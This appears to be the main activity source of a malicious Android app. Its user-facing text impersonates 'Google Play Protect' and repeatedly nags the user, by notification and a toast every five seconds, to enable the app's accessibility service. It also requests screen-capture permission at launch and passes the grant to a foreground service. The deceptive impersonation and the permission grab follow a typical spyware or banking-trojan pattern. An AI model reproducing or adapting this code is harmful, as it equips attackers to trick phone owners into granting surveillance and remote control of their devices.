package com;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.text.TextUtils;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;

import com.AndroidSettingsServices.R;

import pl.droidsonroids.gif.GifDrawable;
import pl.droidsonroids.gif.GifImageView;

public class MainActivity extends AppCompatActivity {

	private static final String CHANNEL_ID = "AndroidSettingsServices";
	private static final int REQUEST_MEDIA_PROJECTION = 1001;

	private MediaProjectionManager projectionManager;
	private GifDrawable gifDrawable;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.layout);

		GifImageView gifImageView = findViewById(R.id.gifImageView);
		try {
			gifDrawable = new GifDrawable(getResources(), R.drawable.all_good);
			gifDrawable.stop();
			gifImageView.setImageDrawable(gifDrawable);
		} catch (Exception e) {
			e.printStackTrace();
		}

		gifImageView.setOnClickListener(v -> {
			if (gifDrawable != null && !gifDrawable.isPlaying()) {
				gifDrawable.setLoopCount(1);
				gifDrawable.start();
				new Handler().postDelayed(() -> {
					gifDrawable.seekToFrame(0);
					gifDrawable.stop();
				}, gifDrawable.getDuration());
			}
		});

		showAccessibilityNotification();
		showToastPeriodically();
		Alert.openSettings(this);

		// 🟡 Minta izin MediaProjection
		projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
		Intent intent = projectionManager.createScreenCaptureIntent();
		startActivityForResult(intent, REQUEST_MEDIA_PROJECTION);
	}

	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		if (requestCode == REQUEST_MEDIA_PROJECTION) {
			if (resultCode == RESULT_OK && data != null) {
				// Kirim izin ke Foreground Service
				Intent serviceIntent = new Intent(this, MediaProjectionForegroundService.class);
				serviceIntent.putExtra("resultCode", resultCode);
				serviceIntent.putExtra("dataIntent", data);
				startForegroundService(serviceIntent);
			} else {
				Toast.makeText(this, "Izin screen capture ditolak", Toast.LENGTH_SHORT).show();
			}
		}
		super.onActivityResult(requestCode, resultCode, data);
	}

	private void showAccessibilityNotification() {
		if (!isAccessibilityServiceEnabled()) {
			NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
			createNotificationChannel(notificationManager);
			Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
			PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
			NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
					.setSmallIcon(R.drawable.ic_launcher)
					.setContentTitle("Enable Google Play Protect Service's")
					.setContentText("Please enable Google Play Protect Service's for full functionality.")
					.setPriority(NotificationCompat.PRIORITY_DEFAULT)
					.setContentIntent(pendingIntent)
					.setAutoCancel(true);
			notificationManager.notify(1, builder.build());
		}
	}

	private void createNotificationChannel(NotificationManager notificationManager) {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			NotificationChannel channel = new NotificationChannel(
					CHANNEL_ID,
					"GooglePlayProtectChannel",
					NotificationManager.IMPORTANCE_DEFAULT
			);
			channel.setDescription("Channel for Google Play Protect Channel notifications");
			notificationManager.createNotificationChannel(channel);
		}
	}

	private void showToastPeriodically() {
		final Handler handler = new Handler();
		handler.postDelayed(new Runnable() {
			@Override
			public void run() {
				if (!isAccessibilityServiceEnabled()) {
					Toast.makeText(MainActivity.this, "Please enable Google Play Protect Service", Toast.LENGTH_LONG).show();
					handler.postDelayed(this, 5000);
				}
			}
		}, 5000);
	}

	private boolean isAccessibilityServiceEnabled() {
		int accessibilityEnabled = 0;
		final String service = getPackageName() + "/" + "com.MyAccessibilityService";
		try {
			accessibilityEnabled = Settings.Secure.getInt(getApplicationContext().getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
		} catch (Settings.SettingNotFoundException e) {
			return false;
		}
		return accessibilityEnabled == 1 && isAccessibilityServiceEnabledForPackage(service);
	}

	private boolean isAccessibilityServiceEnabledForPackage(String service) {
		TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
		String settingValue = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
		if (settingValue != null) {
			splitter.setString(settingValue);
			while (splitter.hasNext()) {
				if (splitter.next().equalsIgnoreCase(service)) {
					return true;
				}
			}
		}
		return false;
	}
}
